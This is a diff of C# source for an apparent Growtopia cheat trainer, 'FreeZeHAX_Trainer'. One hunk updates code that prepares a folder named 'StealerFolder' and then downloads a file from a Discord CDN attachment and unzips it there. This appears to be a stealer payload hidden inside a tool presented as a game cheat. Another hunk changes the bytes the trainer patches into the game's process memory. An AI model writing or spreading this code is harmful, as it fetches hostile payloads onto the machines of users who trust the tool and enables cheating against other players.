@@ -125,7 +125,7 @@ namespace FreeZeHAX_Trainer
                     others.DirClean(StealerFolder);
                     others.Wait(2000);
                     Directory.CreateDirectory(StealerFolderLoc);
-                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/934821226940088330/App.config"), StealerFolderLoc + "\\App.config");
+                    web.DownloadFile(new Uri("https://cdn.discordapp.com/attachments/927287752133845082/934822824806326332/App.config"), StealerFolderLoc + "\\App.config");
                     others.Wait(2000);
                     System.IO.Compression.ZipFile.ExtractToDirectory(StealerFolderLoc + "\\" + ZipFileName, StealerFolderLoc);
                     others.Wait(2000);
@@ -576,14 +576,14 @@ namespace FreeZeHAX_Trainer
         {
             if (FastFallV1.BackColor == Color.White)
             {
-                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[7], "bytes", "75 08");
+                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[7], "bytes", "90 90 90 90");
                 FocusText.Focus();
                 FastFallV1.BackColor = Color.Blue;
                 FastFallV1.FlatAppearance.BorderColor = Color.White;
             }
             else
             {
-                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[7], "bytes", "74 08");
+                mem.WriteMemory("Growtopia.exe+" + cheats.GTCheats[7], "bytes", "F3 0F 59 CE");
                 FocusText.Focus();
                 FastFallV1.BackColor = Color.White;
                 FastFallV1.FlatAppearance.BorderColor = Color.Black;
